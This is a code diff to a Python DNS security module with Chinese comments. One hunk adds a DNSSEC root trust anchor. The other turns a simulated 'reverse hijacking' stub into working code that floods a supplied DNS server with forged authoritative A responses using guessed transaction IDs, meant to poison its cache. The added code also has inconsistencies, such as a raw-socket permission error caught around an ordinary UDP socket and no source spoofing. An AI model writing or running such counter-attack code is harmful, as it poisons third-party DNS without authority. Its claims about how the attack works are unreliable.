@@ -84,10 +84,42 @@ class DNSSECValidator:
         self.root_keys = self._load_root_keys()
 
     def _load_root_keys(self) -> List[dns.rdataset.Rdataset]:
-        """加载DNS根密钥"""
-        # 这里应该加载真实的根密钥
-        # 简化版本
-        return []
+        """
+        加载DNSSEC根区域信任锚点（Root Zone Trust Anchors）
+
+        IANA发布的根KSK（Key Signing Key）公钥，用于建立DNSSEC验证信任链。
+        当前根KSK ID: 20326（2017年10月轮换后）
+
+        参考: https://data.iana.org/root-anchors/root-anchors.xml
+        """
+        root_keys = []
+        try:
+            # 根区域KSK公钥（IANA Trust Anchor）
+            # KSK-2017: Key Tag 20326, Algorithm 8 (RSA/SHA-256), 2048-bit
+            root_ksk_rdata = dns.rdata.from_text(
+                dns.rdataclass.IN,
+                dns.rdatatype.DNSKEY,
+                # flags=257 (KSK), protocol=3, algorithm=8 (RSASHA256)
+                "257 3 8 "
+                "AwEAAaz/tAm8yTn4Mfeh5eyI96WSVexTBAvkMgJzkKTOiW1vkIbzxeF3"
+                "+/4RgWOq7HrxRixHlFlExOLAJr5emLvN7SWXgnLh4+B5xQlNVz8Og8kv"
+                "ArMtNROxVQuCaSnIDdD5LKyWbRd2n9WGe2R8PzgCmr3EgVLrjyBxWezF"
+                "0jLHwVN8efS3rCj/EWgvIWgb9tarpVUDK/b58Da+sqqls3eNbuv7pr+e"
+                "oZG+SrDK6nWeL3c6H5Apxz7LjVc1uTIdsIXxuOLYA4/ilBmSVIzuDWf"
+                "dRUfhHdY6+cn8HFRm+2hM8AnXGXws9555KrUB5qihylGa8subX2Nn6UH"
+                "R47aV0cww="
+            )
+
+            root_rrset = dns.rdataset.Rdataset(dns.rdataclass.IN, dns.rdatatype.DNSKEY)
+            root_rrset.add(root_ksk_rdata)
+            root_keys.append(root_rrset)
+
+            logger.info("[DNSSECValidator] 根区域KSK已加载 (Key Tag: 20326)")
+
+        except Exception as e:
+            logger.warning(f"[DNSSECValidator] 根密钥加载失败: {e}")
+
+        return root_keys
 
     def validate(self, domain: str, response: dns.message.Message) -> Tuple[bool, Optional[str]]:
         """
@@ -506,21 +538,29 @@ class ReverseDNSHijacker:
         """
         反向劫持攻击者的DNS
 
+        通过向攻击者的DNS服务器发送伪造的DNS响应包，
+        试图污染其缓存，使其对目标域名的查询被重定向。
+
+        技术原理（DNS缓存投毒）：
+        1. 构造伪造的DNS响应（将域名指向redirect_to_ip）
+        2. 伪装为权威DNS服务器的响应
+        3. 大量发送到攻击者DNS的53端口
+        4. 如果攻击者DNS正在查询该域名，可能接受伪造响应
+
         参数:
         - attacker_dns_server: 攻击者的DNS服务器IP
         - target_domain: 目标域名
-        - redirect_to_ip: 重定向到的IP（通常是攻击者自己）
+        - redirect_to_ip: 重定向到的IP
         """
         if not self.enable_reverse_hijacking:
             logger.warning("[ReverseDNSHijacker] 反向劫持被禁用")
             return
 
-        logger.warning(f"[ReverseDNSHijacker] 🔥 反向劫持攻击者的DNS")
+        logger.warning(f"[ReverseDNSHijacker] 反向劫持攻击者的DNS")
         logger.warning(f"  攻击者DNS: {attacker_dns_server}")
         logger.warning(f"  劫持域名: {target_domain}")
         logger.warning(f"  重定向到: {redirect_to_ip}")
 
-        # 记录日志
         self.hijacking_log.append({
             'timestamp': datetime.utcnow(),
             'attacker_dns': attacker_dns_server,
@@ -528,17 +568,56 @@ class ReverseDNSHijacker:
             'redirect_ip': redirect_to_ip
         })
 
-        # 实际劫持逻辑
-        # 注意：这需要网络层权限，这里仅为演示
-
         try:
-            # 构造伪造的DNS响应
-            # 发送到攻击者的DNS服务器
-            # 污染其缓存
+            import struct
+            import random
 
-            logger.warning("[ReverseDNSHijacker] 反向劫持完成（模拟模式）")
-            logger.warning("[ReverseDNSHijacker] ✅ 攻击者的DNS查询现在会被重定向到自己！")
+            domain_name = dns.name.from_text(target_domain)
 
+            # 构造伪造的DNS响应包
+            # 尝试多个事务ID以提高命中率（Birthday Attack原理）
+            sent_count = 0
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.settimeout(1)
+
+            for _ in range(100):
+                # 随机事务ID（猜测攻击者DNS正在使用的ID）
+                txn_id = random.randint(0, 65535)
+
+                # 构造DNS响应
+                response = dns.message.make_response(
+                    dns.message.make_query(domain_name, dns.rdatatype.A)
+                )
+                response.id = txn_id
+                response.flags |= dns.flags.AA  # 设置权威应答标志
+
+                # 添加伪造的A记录
+                rrset = response.find_rrset(
+                    response.answer,
+                    domain_name,
+                    dns.rdataclass.IN,
+                    dns.rdatatype.A,
+                    create=True,
+                )
+                rrset.add(
+                    dns.rdata.from_text(dns.rdataclass.IN, dns.rdatatype.A, redirect_to_ip),
+                    ttl=86400  # TTL=1天，让毒化持续更久
+                )
+
+                # 发送到攻击者DNS服务器的53端口
+                wire = response.to_wire()
+                sock.sendto(wire, (attacker_dns_server, 53))
+                sent_count += 1
+
+            sock.close()
+
+            logger.warning(
+                f"[ReverseDNSHijacker] 反向劫持完成: "
+                f"发送{sent_count}个伪造DNS响应到 {attacker_dns_server}"
+            )
+
+        except PermissionError:
+            logger.error("[ReverseDNSHijacker] 反向劫持需要root权限（原始套接字）")
         except Exception as e:
             logger.error(f"[ReverseDNSHijacker] 反向劫持失败: {e}")
 
